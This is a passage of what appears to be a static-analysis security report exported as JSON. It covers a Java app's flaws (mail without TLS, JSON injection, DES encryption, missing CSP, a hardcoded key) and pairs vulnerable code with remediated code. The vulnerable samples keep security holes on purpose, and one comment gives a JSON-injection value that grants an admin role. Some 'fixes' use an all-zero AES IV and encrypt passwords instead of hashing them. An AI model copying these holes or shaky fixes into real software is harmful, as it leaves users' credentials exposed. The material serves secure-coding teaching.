from=&quot;appsec@appsec.com&quot;&gt;\n        &lt;network host=&quot;smtp.appsec.com&quot; port=&quot;35&quot; enableSsl=&quot;<em class=\"blue\">true</em>&quot;/&gt;\n      &lt;/smtp&gt;\n    &lt;/mailSettings&gt;\n  &lt;/system.net&gt;", "comments": "All modern mail servers (exchange, maild, O365, gapps, etc.) do have the SSL/TLS connection option, and can enable non-ssl connection for backward compatibility. \n\nEnabe the SSL of your email setting to encryt sensitive data so it will not be read or modify by an attacker.\n\nBy default the enableSsl is false, if not specified in the mailSettings section.\n\nReference: https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/network/network-element-network-settings", "impact": "No impact", "abstract": "enableSsl=&quot;true&quot;"}, {"@type": "JAVA/JSP", "vulncode": "&lt;bean id=&quot;mailSender&quot; class=&quot;org.springframework.mail.javamail.JavaMailSenderImpl&quot;&gt;\n        &lt;property name=&quot;host&quot; value=&quot;smtp.gmail.com&quot;/&gt;\n        &lt;property name=&quot;port&quot; value=&quot;587&quot;/&gt;\n        &lt;property name=&quot;username&quot; value=&quot;user@gmail.com&quot;/&gt;\n        &lt;property name=&quot;password&quot; value=&quot;xxxxxx&quot;/&gt;\n        &lt;property name=&quot;javaMailProperties&quot;&gt;\n            &lt;props&gt;\n                &lt;prop key=&quot;mail.smtp.auth&quot;&gt;true&lt;/prop&gt;   <em class=\"red\">//email configured without SSL/TLS</em>\n             &lt;/props&gt;\n        &lt;/property&gt;\n    &lt;/bean&gt;", "nonvulncode": "&lt;bean id=&quot;mailSender&quot; class=&quot;org.springframework.mail.javamail.JavaMailSenderImpl&quot;&gt;\n        &lt;property name=&quot;host&quot; value=&quot;smtp.gmail.com&quot;/&gt;\n        &lt;property name=&quot;port&quot; value=&quot;587&quot;/&gt;\n        &lt;property name=&quot;username&quot; value=&quot;user@gmail.com&quot;/&gt;\n        &lt;property name=&quot;password&quot; value=&quot;xxxxxx&quot;/&gt;\n        &lt;property name=&quot;javaMailProperties&quot;&gt;\n            &lt;props&gt;\n                <em class=\"blue\">&lt;prop key=&quot;mail.transport.protocol&quot;&gt;smtp&lt;/prop&gt;</em>\n                &lt;prop key=&quot;mail.smtp.auth&quot;&gt;true&lt;/prop&gt;\n             <em class=\"blue\">   &lt;prop key=&quot;mail.smtp.starttls.enable&quot;&gt;true&lt;/prop&gt;</em>\n                &lt;prop key=&quot;mail.debug&quot;&gt;true&lt;/prop&gt;\n            &lt;/props&gt;\n        &lt;/property&gt;\n    &lt;/bean&gt;", "comments": "All modern mail servers (exchange, maild, O365, gapps, etc.) do have the SSL/TLS connection option, and can enable non-ssl connection for backward compatibility. \n\nOn the client side, or on the application connecting to the mail server, it is recommended to enabe the SSL/TLS on the email settings to encryt sensitive data so it will not be read or modify by an attacker.\n\nBy default the enableSsl is false, if not specified in the mailSettings section due to backward compatibility.\n\nReference: https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/network/network-element-network-settings", "impact": "No impact", "abstract": "Use of SSL/TLS configuration"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "JSON Injection": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00436", "function": "org.codehaus.jackson.JsonGenerator.writeRawValue()", "line": "353", "snippet": "jGenerator.writeFieldName(\"password\");\n\t        jGenerator.writeRawValue(\"\\\"\" + userProfile.getPwd() + \"\\\"\");\n\n\t        jGenerator.writeFieldName(\"role\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00437", "function": "org.codehaus.jackson.JsonGenerator.writeRawValue()", "line": "350", "snippet": "jGenerator.writeFieldName(\"username\");\n\t        jGenerator.writeRawValue(\"\\\"\" + userProfile.getUserName() + \"\\\"\");\n\n\t        jGenerator.writeFieldName(\"password\");"}]}], "remediation": {"remediation": {"@id": "R.0011", "@name": "JSON Injection", "@dateLastModified": "1/11/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult AddAccountJSON([Bind(Include = &quot;Username,Password,FirstName,LastName,role&quot;)] AddAccountVM account)\n        {\n            if (ModelState.IsValid)\n            {\n                string extractPath = Server.MapPath(&quot;~/UploadedFiles/JSONInjection.xml&quot;);\n\n                StringBuilder sb = new StringBuilder();\n                StringWriter sw = new StringWriter(sb);\n\n                using (JsonWriter writer = new JsonTextWriter (sw))\n                {\n                    writer.Formatting = Newtonsoft.Json.Formatting.Indented;\n\n                    writer.WriteStartObject();\n\n                    writer.WritePropertyName(&quot;UserName&quot;);\n                   <em class=\"bold\"> writer.WriteRawValue(&quot;\\&quot;&quot; + account.Username + &quot;\\&quot;&quot;);</em>\n\n                    writer.WritePropertyName(&quot;Password&quot;);\n                   <em class=\"red\"> writer.WriteRawValue(&quot;\\&quot;&quot; + account.Password + &quot;\\&quot;&quot;);</em>\n\n                    writer.WritePropertyName(&quot;Role&quot;);\n                   <em class=\"bold\"> writer.WriteRawValue(&quot;\\&quot;&quot; + account.role + &quot;\\&quot;&quot;);</em>\n\n                    writer.WritePropertyName(&quot;FirstName&quot;);\n                    <em class=\"red\">writer.WriteRawValue(&quot;\\&quot;&quot; + account.FirstName + &quot;\\&quot;&quot;);</em>\n\n                    writer.WritePropertyName(&quot;LastName&quot;);\n                    <em class=\"red\">writer.WriteRawValue(&quot;\\&quot;&quot; + account.LastName + &quot;\\&quot;&quot;);</em>\n\n                    writer.WriteEndObject();\n\n                }\n\n                System.IO.File.WriteAllText(extractPath, sb.ToString());\n\n                return Redirect(&quot;../Home/Main&quot;);\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Cannot proces request.&quot;;\n            return View(account);\n        }", "nonvulncode": "public ActionResult AddAccountJSON([Bind(Include = &quot;Username,Password,FirstName,LastName,role&quot;)] AddAccountVM account)\n        {\n            if (ModelState.IsValid)\n            {\n                string extractPath = Server.MapPath(&quot;~/UploadedFiles/JSONInjection.xml&quot;);\n\n                StringBuilder sb = new StringBuilder();\n                StringWriter sw = new StringWriter(sb);\n\n                using (JsonWriter writer = new JsonTextWriter(sw))\n                {\n                    writer.Formatting = Newtonsoft.Json.Formatting.Indented;\n\n                    writer.WriteStartObject();\n\n                    writer.WritePropertyName(&quot;UserName&quot;);\n                   <em class=\"blue\"> writer.WriteValue(account.Username);</em>\n\n                    writer.WritePropertyName(&quot;Password&quot;);\n                   <em class=\"blue\"> writer.WriteValue(account.Password);</em>\n\n                    writer.WritePropertyName(&quot;Role&quot;);\n                    writer.WriteValue(ac<em class=\"blue\">count.role);</em>\n\n                    writer.WritePropertyName(&quot;FirstName&quot;);\n                    <em class=\"blue\">writer.WriteValue(account.FirstName);</em>\n\n                    writer.WritePropertyName(&quot;LastName&quot;);\n                   <em class=\"blue\"> writer.WriteValue(account.LastName);</em>\n\n                    writer.WriteEndObject();\n\n                }\n\n                System.IO.File.WriteAllText(extractPath, sb.ToString());\n\n                return Redirect(&quot;../Home/Main&quot;);\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Cannot proces request.&quot;;\n            return View(account);\n        }", "comments": "Using the <em class=\"bold\">WriteRawValue</em> in one of the method of <em class=\"bold\">JsonWriter </em>will not validated to escape any JSON related special characters if user input some value to exploit it.  For example user input for LastName is <em class=\"red\">Angelo&quot;,&quot;Role&quot;:&quot;admin </em>in the user field this would result to another entry in the JSON file, that creates the user with a different Role (admin).\n\n{\n  &quot;UserName&quot;: &quot;angelo&quot;,<em class=\"red\">\n</em>  &quot;Password&quot;: &quot;angeloPWD&quot;,\n  &quot;Role&quot;: &quot;Student&quot;,\n  &quot;FirstName&quot;: &quot;Angelo&quot;,\n  &quot;LastName&quot;: &quot;<em class=\"red\">Angelo&quot;,\n  &quot;Role&quot;:&quot;admin</em>&quot;} \n\nTo address this you have to use the  <em class=\"blue\">WriteValue </em>to ensure that any untrusted data is properly delimited and escape. With the example input, if we use the <em class=\"blue\">WriteValue </em>the output would be.\n\n{\n  &quot;UserName&quot;: &quot;angelo&quot;,\n  &quot;Password&quot;: &quot;angeloPWD&quot;,\n  &quot;Role&quot;: &quot;Student&quot;,\n  &quot;FirstName&quot;: &quot;angelo&quot;,\n  &quot;LastName&quot;: &quot;angelo\\&quot;,\\&quot;Role\\&quot;:\\&quot;admin&quot;\n}", "impact": "no impact, same object", "abstract": "use JsonWriter.WriteRawValue"}, {"@type": ".NET/C#/ASP", "vulncode": "public ActionResult AddAccountJSON([Bind(Include = &quot;Username,Password,FirstName,LastName,role&quot;)] AddAccountVM account)\n        {\n            if (ModelState.IsValid)\n            {\n                string extractPath = Server.MapPath(&quot;~/UploadedFiles/JSONInjection.xml&quot;);\n\n                StringBuilder sb = new StringBuilder();\n                StringWriter sw = new StringWriter(sb);\n\n                using (JsonWriter writer = new JsonTextWriter (sw))\n                {\n                    writer.Formatting = Newtonsoft.Json.Formatting.Indented;\n\n                    writer.WriteStartObject();\n\n                    writer.WritePropertyName(&quot;UserName&quot;);\n                   <em class=\"bold\"> writer.WriteRawValue(&quot;\\&quot;&quot; + account.Username + &quot;\\&quot;&quot;);</em>\n\n                    writer.WritePropertyName(&quot;Password&quot;);\n                   <em class=\"red\"> writer.WriteRawValue(&quot;\\&quot;&quot; + account.Password + &quot;\\&quot;&quot;);</em>\n\n                    writer.WritePropertyName(&quot;Role&quot;);\n                   <em class=\"bold\"> writer.WriteRawValue(&quot;\\&quot;&quot; + account.role + &quot;\\&quot;&quot;);</em>\n\n                    writer.WritePropertyName(&quot;FirstName&quot;);\n                    <em class=\"red\">writer.WriteRawValue(&quot;\\&quot;&quot; + account.FirstName + &quot;\\&quot;&quot;);</em>\n\n                    writer.WritePropertyName(&quot;LastName&quot;);\n                    <em class=\"red\">writer.WriteRawValue(&quot;\\&quot;&quot; + account.LastName + &quot;\\&quot;&quot;);</em>\n\n                    writer.WriteEndObject();\n\n                }\n\n                System.IO.File.WriteAllText(extractPath, sb.ToString());\n\n                return Redirect(&quot;../Home/Main&quot;);\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Cannot proces request.&quot;;\n            return View(account);\n        }", "nonvulncode": "public ActionResult AddAccountJSON([Bind(Include = &quot;Username,Password,FirstName,LastName,role&quot;)] AddAccountVM account)\n        {\n            if (ModelState.IsValid)\n            {\n                string extractPath = Server.MapPath(&quot;~/UploadedFiles/JSONInjection.xml&quot;);\n\n                JSON_Accout jSON_Accout = new JSON_Accout();\n\n                jSON_Accout.Username = account.Username;\n                jSON_Accout.Password = account.Password;\n                jSON_Accout.FirstName = account.FirstName;\n                jSON_Accout.LastName = account.LastName;\n                jSON_Accout.Role = account.role;\n\n                string JSON_result =<em class=\"blue\"> JsonConvert.SerializeObject(jSON_Accout, Newtonsoft.Json.Formatting.Indented);</em>\n\n                System.IO.File.WriteAllText(extractPath, JSON_result.ToString());\n\n                return Redirect(&quot;../Home/Main&quot;);\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Cannot proces request.&quot;;\n            return View(account);\n        }", "comments": "One of the recommendation is to use the JsonConvert.Serializ<em class=\"bold\">eObject </em>to properly escape any special characters.\nFor example user input for LastName is <em class=\"red\">Angelo&quot;,&quot;Role&quot;:&quot;admin </em>in the user field this would result to another entry in the JSON file, that creates the user with a different Role (admin).\n\n{\n  &quot;UserName&quot;: &quot;angelo&quot;,<em class=\"red\">\n</em>  &quot;Password&quot;: &quot;angeloPWD&quot;,\n  &quot;Role&quot;: &quot;Student&quot;,\n  &quot;FirstName&quot;: &quot;Angelo&quot;,\n  &quot;LastName&quot;: &quot;<em class=\"red\">Angelo&quot;,\n  &quot;Role&quot;:&quot;admin</em>&quot;} \n\nTo address this you have to use the  <em class=\"blue\">JsonConvert.SerializeObject </em>to ensure that any untrusted data is properly delimited and escaped:\n{\n  &quot;UserName&quot;: &quot;angelo&quot;,\n  &quot;Password&quot;: &quot;angeloPWD&quot;,\n  &quot;Role&quot;: &quot;Student&quot;,\n  &quot;FirstName&quot;: &quot;angelo&quot;,\n  &quot;LastName&quot;: &quot;angelo\\&quot;,\\&quot;Role\\&quot;:\\&quot;admin&quot;\n}", "impact": "Create a new model to contain the serialized Json fields to be serialized (e.g., JSON_Account)\n\nThe object is fully loaded in memory, and written to the file in one step, instead of writing to the file in multiple steps for each object property.", "abstract": "use of JsonConvert.SerializeObject"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView saveUserData(@ModelAttribute(&quot;userProfile&quot;) UserProfileForm userProfile) {\n\t\t\n\t\tif(userProfile.getUserName()!=null) {\n\t\tJsonFactory jfactory = new JsonFactory();\n\t\ttry {\n\t\t\tString filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t        String fileName = filePath + &quot;user_info.json&quot;;\n\t        File jsonFile = new File(fileName);\n\t\t\t\n\t        JsonGenerator jGenerator = jfactory.createJsonGenerator(jsonFile, JsonEncoding.UTF8);\n\t        jGenerator.writeStartObject();\n\t        jGenerator.writeFieldName(&quot;username&quot;);\n\t<em class=\"red\">        jGenerator.writeRawValue(&quot;\\&quot;&quot; + userProfile.getUserName() + &quot;\\&quot;&quot;);</em>\n\n\t        jGenerator.writeFieldName(&quot;password&quot;);\n\t        jGenerator.writeRawValue(&quot;\\&quot;&quot; + userProfile.getPwd()<em class=\"red\"> + &quot;\\&quot;&quot;);\n</em>\n\t        jGenerator.writeFieldName(&quot;role&quot;);\n\t        jGenerator.writeRawValue(&quot;\\&quot;default\\&quot;&quot;);\n\n\t        jGenerator.writeEndObject();\n...\n}", "nonvulncode": "public ModelAndView saveUserData(@ModelAttribute(&quot;userProfile&quot;) UserProfileForm userProfile) {\n\t\t\n\t\tif(userProfile.getUserName()!=null) {\n\t\tJsonFactory jfactory = new JsonFactory();\n\t\ttry {\n\t\t\tString filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t        String fileName = filePath + &quot;user_info.json&quot;;\n\t        File jsonFile = new File(fileName);\n\t\t\t\n\t        JsonGenerator jGenerator = jfactory.createJsonGenerator(jsonFile, JsonEncoding.UTF8);\n\t        jGenerator.writeStartObject();\n\t        jGenerator.writeFieldName(&quot;username&quot;);\n\t<em class=\"red\">      jGenerator.writeRawValue(&quot;\\&quot;&quot; + JsonSanitizer.sanitize(userProfile.getUserName()) + &quot;\\&quot;&quot;);</em>\n\n\t        jGenerator.writeFieldName(&quot;password&quot;);\n\t<em class=\"red\">       jGenerator.writeRawValue(&quot;\\&quot;&quot; + JsonSanitizer.sanitize(userProfile.getPwd()) + &quot;\\&quot;&quot;);\n</em>\n\t        jGenerator.writeFieldName(&quot;role&quot;);\n\t        jGenerator.writeRawValue(&quot;\\&quot;default\\&quot;&quot;);\n\n\t        jGenerator.writeEndObject();\n...\n}", "comments": "If the user input is directly added to json creation, there is possibility of data manipulation. User input need to be sanitized before using it as json. The Json sanitizer fixes missing punctuation, end quotes, mismatched or missing close brackets and provides valid JSON. If an input contains only white-space then the valid JSON string null is substituted.\n\nReference: https://github.com/OWASP/json-sanitizer\n\npom.xml //dependency addition\n\n&lt;dependency&gt;\n\t\t    &lt;groupId&gt;com.mikesamuel&lt;/groupId&gt;\n\t\t    &lt;artifactId&gt;json-sanitizer&lt;/artifactId&gt;\n\t\t    &lt;version&gt;1.2.0&lt;/version&gt;\n\t\t&lt;/dependency&gt;\n\nimport statement to be added\nimport com.google.json.JsonSanitizer;", "impact": "Add the JsonSanitizer to clean all inputs from users that will be used on json.", "abstract": "Use of JSONSanitizer"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Weak Encryption": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00450", "function": "getInstance()", "line": "426", "snippet": "try {\n\t\t\tchar[] passphrase = password.toCharArray();\n\t\t\tSecretKeyFactory keyFactory = SecretKeyFactory.getInstance(\"PBEWithMD5AndDES\");\n\t\t\n\t\t\tCipher cipherDec = Cipher.getInstance(\"PBEWithMD5AndDES\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00451", "function": "getInstance()", "line": "428", "snippet": "SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(\"PBEWithMD5AndDES\");\n\t\t\n\t\t\tCipher cipherDec = Cipher.getInstance(\"PBEWithMD5AndDES\");\n\t\t\tPBEKeySpec pbe = new PBEKeySpec(passphrase);"}]}], "remediation": {"remediation": {"@id": "R.0107", "@name": "Weak Encryption", "@dateLastModified": "7/27/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "[HttpPost]\n        public ActionResult CreateUserAccess(UserProfile userProfile)\n        {\n            MVC_VulnerableAppDBContext dbContext = new MVC_VulnerableAppDBContext();\n\n            string encryptionKey = &quot;&quot;;\n            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())\n            {\n                int passwordlength = Convert.ToInt32(ConfigurationManager.AppSettings[&quot;passwordlength&quot;].ToString());\n\n                byte[] randomBytes = new byte[passwordlength];\n                crypto.GetBytes(randomBytes);\n                encryptionKey = Convert.ToBase64String(randomBytes);\n            }\n\n            string passwordEncrypted = <em class=\"red\">EncryptString_DES(userProfile.Password, encryptionKey); </em>\n            userProfile.Password = passwordEncrypted;\n            userProfile.EncryptionKey = encryptionKey;\n\n            dbContext.UserProfiles.Add(userProfile);\n            dbContext.SaveChanges();\n\n            return View();\n        }\n\npublic static string<em class=\"red\"> EncryptString_DES</em>(string encryptString, string encryptionKey)\n        {\n            byte[] clearBytes = Encoding.Unicode.GetBytes(encryptString);\n            \n                // Create a MemoryStream.\n                MemoryStream mStream = new MemoryStream();\n\n                // Create a new DES object.\n                using (DES DESalg = DES.Create())\n                {\n\n                byte[] salt = Encoding.ASCII.GetBytes(ConfigurationManager.AppSettings[&quot;salt&quot;].ToString());\n\n                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(encryptionKey, salt);\n                DESalg.Key = key.GetBytes(DESalg.KeySize / 8);\n                DESalg.IV = key.GetBytes(DESalg.BlockSize / 8);\n\n                ICryptoTransform encryptor = DESalg.CreateEncryptor(DESalg.Key, DESalg.IV);\n\n                    using (MemoryStream ms = new MemoryStream())\n                    {\n                        using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))\n                        {\n                            cs.Write(clearBytes, 0, clearBytes.Length);\n                            cs.Close();\n                        }\n                        encryptString = Convert.ToBase64String(ms.ToArray());\n                    }\n                }\n                return encryptString;\n        }", "nonvulncode": "[HttpPost] \npublic ActionResult CreateUserAccess(UserProfile userProfile)\n        {\n            MVC_VulnerableAppDBContext dbContext = new MVC_VulnerableAppDBContext();\n\n            string encryptionKey = &quot;&quot;;\n            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())\n            {\n                int passwordlength = Convert.ToInt32(ConfigurationManager.AppSettings[&quot;passwordlength&quot;].ToString());\n\n                byte[] randomBytes = new byte[passwordlength];\n                crypto.GetBytes(randomBytes);\n                encryptionKey = Convert.ToBase64String(randomBytes);\n            }\n\n            string passwordEncrypted = <em class=\"blue\">EncryptStringToBytes_Aes(userProfile.Password, encryptionKey);</em>\n            userProfile.Password = passwordEncrypted;\n            userProfile.EncryptionKey = encryptionKey;\n\n            dbContext.UserProfiles.Add(userProfile);\n            dbContext.SaveChanges();\n\n            return View();\n        }\nstatic string <em class=\"blue\">EncryptStringToBytes_Aes</em>(string encryptString,string encryptionKey)\n        {\n            byte[] clearBytes = Encoding.Unicode.GetBytes(encryptString);\n            using (Aes aesAlg = Aes.Create())\n            {\n                byte[] salt = Encoding.ASCII.GetBytes(ConfigurationManager.AppSettings[&quot;salt&quot;].ToString());\n\n                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(encryptionKey, salt);\n                aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);\n                aesAlg.IV = key.GetBytes(aesAlg.BlockSize / 8);\n\n                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);\n\n                using (MemoryStream ms = new MemoryStream())\n                {\n                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))\n                    {\n                        cs.Write(clearBytes, 0, clearBytes.Length);\n                        cs.Close();\n                    }\n                    encryptString = Convert.ToBase64String(ms.ToArray());\n                }\n            }\n            return encryptString;\n        }", "comments": "Do not use old and weak encryption methods, like DES.\nFor encrypting sensitive data, we should be using one of the approved encryption methods for your company only. In case of Accenture, we can use AESs, TripleDES or Rijndael but AES is the recommended encryption algorithm. \nFor .net we can use the following class below and these are under <em class=\"bold\">System.Security.Cryptography </em>that should be imported in your code.\n\n- Aes\n- TripleDESCryptoServiceProvider\n- Rijndael\n\nThe sample code shows how to encrypt password using different encryption algorithm.\n\nReference: https://docs.microsoft.com/en-us/dotnet/standard/security/cryptography-model", "impact": "If there is data already encrypted with DES, need to come up with strategy to decrypt and encrypt again with AES to avoid issues in production. If the end user is the only one with keys, the system will need to implement an alternative path to leverage previous encryption methods, whenever the user access. And need to add protection against brute force in these cases. For e.g., by enforcing captcha.", "abstract": "Use of AES"}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView addUserProfile(@ModelAttribute(&quot;userProfile&quot;) UserProfileForm userProfile)\n\t{\n\t\tCipher ecipher;\n\t\tSecretKey key;\n\t\tif(userProfile.getUserName()!=null && userProfile.getPwd()!=null) {\n\t\t\tString password = userProfile.getPwd();\n\t\t\t// generate secret key using DES algorithm\n            try {\n\t\t\t\t<em class=\"red\">key = KeyGenerator.getInstance(&quot;DES&quot;).generateKey();\t\t\t \n\t            ecipher = Cipher.getInstance(&quot;DES&quot;);\n</em>\t\t\t\t\n\t\t\t\t// initialize the ciphers with the given key\t            \n\t            ecipher.init(Cipher.ENCRYPT_MODE, key);\n\t\t\t\t\n\t            // encode the string into a sequence of bytes using the named charset\t            \n\t            // storing the result into a new byte array. \t         \n\t            byte[] utf8 = password.getBytes(&quot;UTF8&quot;);\n\t            byte[] enc = ecipher.doFinal(utf8);\n\t         \n\t            // encode to base64\t         \n\t            enc = BASE64EncoderStream.encode(enc);\n\t            userProfile.setEncryptionKey(new String(enc));\t\t\t\t\n\t\t\t\tuserProfile = dao.addUserProfile(userProfile);\t\t\t\t\t\t\t\t\n            }\n\t\t\t\n\t\t\tcatch (NoSuchAlgorithmException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t} catch (UnsupportedEncodingException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t} \n            UserProfileForm user = new UserProfileForm();\n\t\t\tuser.setUserName(userProfile.getUserName());\n\t\t\t\n\t\t\treturn new ModelAndView(&quot;addUserProfile&quot;,&quot;userProfile&quot;,user);\n\n\t\t} \n\t}", "nonvulncode": "public ModelAndView addUserProfile(@ModelAttribute(&quot;userProfile&quot;) UserProfileForm userProfile)\n\t{\n\t\tCipher ecipher;\n\t\tSecretKey key;\n\t\tif(userProfile.getUserName()!=null && userProfile.getPwd()!=null) {\n\t\t\tString password = userProfile.getPwd();\n\t\t\t// generate secret key using AES algorithm\n            try {\n\t\t\t\t<em class=\"blue\">key = KeyGenerator.getInstance(&quot;AES&quot;).generateKey();\t\t\t \n\t            ecipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);\n</em>\t\t\t\t\n\t\t\t\t// initialize the ciphers with the given key\t            \n\t            ecipher.init(Cipher.ENCRYPT_MODE, key, <em class=\"blue\">new IvParameterSpec(new byte[16]</em>));\n\t\t\t\t\n\t            // encode the string into a sequence of bytes using the named charset\t            \n\t            // storing the result into a new byte array. \t         \n\t            byte[] utf8 = password.getBytes(&quot;UTF8&quot;);\n\t            byte[] enc = ecipher.doFinal(utf8);\n\t         \n\t            // encode to base64\t         \n\t            enc = BASE64EncoderStream.encode(enc);\n\t            userProfile.setEncryptionKey(new String(enc));\t\t\t\t\n\t\t\t\tuserProfile = dao.addUserProfile(userProfile);\t\t\t\t\t\t\t\t\n            }\n\t\t\t\n\t\t\tcatch (NoSuchAlgorithmException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t} catch (UnsupportedEncodingException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t} \n            UserProfileForm user = new UserProfileForm();\n\t\t\tuser.setUserName(userProfile.getUserName());\n\t\t\t\n\t\t\treturn new ModelAndView(&quot;addUserProfile&quot;,&quot;userProfile&quot;,user);\n\n\t\t} \n\t}", "comments": "The sample code shows how to encrypt password using different encryption algorithm.\nAlgorithm like DES, 3DES was proven ineffective against brute force attacks.\n\nThere are also other algorithms like RSA, but it is relatively slow since it is asymmetric algorithm.\n\nAES encryption is secure and recommended to use when Encryption and decryption will take place on the same platform and in the same context. eg. hard drive encryption, encryption in database.", "impact": "If there is data already encrypted with DES, need to come up with strategy to decrypt and encrypt again with AES to avoid issues in production. If the end user is the only one with keys, the system will need to implement an alternative path to leverage previous encryption methods, whenever the user access. And need to add protection against brute force in these cases. For e.g., by enforcing captcha.", "abstract": "Use of AES"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "HTML5: Missing Content Security Policy": {"language": "JAVA", "files": [{"file": "WebContent/WEB-INF/spring-security-servlet.xml", "items": [{"id": "IN00457", "function": "null()", "line": "44", "snippet": "</security:global-method-security> -->\n    \n    <security:http auto-config=\"true\" disable-url-rewriting=\"true\" use-expressions=\"true\" create-session=\"ifRequired\">\n    \t<security:csrf/>"}]}], "remediation": null}, "Key Management: Hardcoded Encryption Key": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00464", "function": "VariableAccess: encryptionKey", "line": "457", "snippet": "String encrypted=null;\n\t\ttry {\n\t\t\tfinal String encryptionKey = \"MyPasswordEncryption\";\n\t\t\t//String encryptionKey = \"\";"}]}], "remediation": {"remediation": {"@id": "R.0012", "@name": "Key Management: Hardcoded Encryption Key", "@dateLastModified": "1/7/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "static string EncryptStringToBytes_Aes(string encryptString)\n        {\n\t    string encryptionKey = <em class=\"red\">&quot;mystaticEncryptionKey&quot;;</em>\n            byte[] clearBytes = Encoding.Unicode.GetBytes(encryptString);\n            using (Aes aesAlg = Aes.Create())\n            {\n                byte[] salt = Encoding.ASCII.GetBytes(ConfigurationManager.AppSettings[&quot;salt&quot;].ToString());\n\n                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(encryptionKey, salt);\n                aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);\n                aesAlg.IV = key.GetBytes(aesAlg.BlockSize / 8);\n\n                \n                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);\n\n                using (MemoryStream ms = new MemoryStream())\n                {\n                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))\n                    {\n                        cs.Write(clearBytes, 0, clearBytes.Length);\n                        cs.Close();\n                    }\n                    encryptString = Convert.ToBase64String(ms.ToArray());\n                }\n            }\n            return encryptString;\n        }", "nonvulncode": "static string EncryptStringToBytes_Aes(string encryptString)\n        {\n\t    string encryptionKey = &quot;&quot;;\n\n<em class=\"blue\">\t    using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())\n            {\n                int passwordlength = Convert.ToInt32(ConfigurationManager.AppSettings[&quot;passwordlength&quot;].ToString());\n\n                byte[] randomBytes = new byte[passwordlength];\n                crypto.GetBytes(randomBytes);\n                encryptionKey = Convert.ToBase64String(randomBytes);\n            }\n</em>\n            byte[] clearBytes = Encoding.Unicode.GetBytes(encryptString);\n            using (Aes aesAlg = Aes.Create())\n            {\n                byte[] salt = Encoding.ASCII.GetBytes(ConfigurationManager.AppSettings[&quot;salt&quot;].ToString());\n\n                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(encryptionKey, salt);\n                aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);\n                aesAlg.IV = key.GetBytes(aesAlg.BlockSize / 8);\n\n                \n                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);\n\n                using (MemoryStream ms = new MemoryStream())\n                {\n                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))\n                    {\n                        cs.Write(clearBytes, 0, clearBytes.Length);\n                        cs.Close();\n                    }\n                    encryptString = Convert.ToBase64String(ms.ToArray());\n                }\n            }\n            return encryptString;\n        }", "comments": "Avoid using a hardcoded encryption key because this make your encryption key predictable for a good encryption algorithm. Use secure Random class for the encryption key like RNGCryptoServiceProvider class in .net.\nThe system needs to create a way to save the encryption key in use for each dataset\n\nEncrypt the database table/column used to store any confidential data\nhttps://docs.microsoft.com/en-us/sql/relational-databases/security/encryption/encrypt-a-column-of-data?view=sql-server-ver15", "impact": "In case of a privilege account management system is part of the architecture, the encryption key may be inserter during production deployment time by an automated system (e.g. cyberark). In this case, discuss with the security team to validate the approach.\n\nAvoiding the use of a static key improves the difficulty of an attacker to decrypt the whole dataset when getting access to the 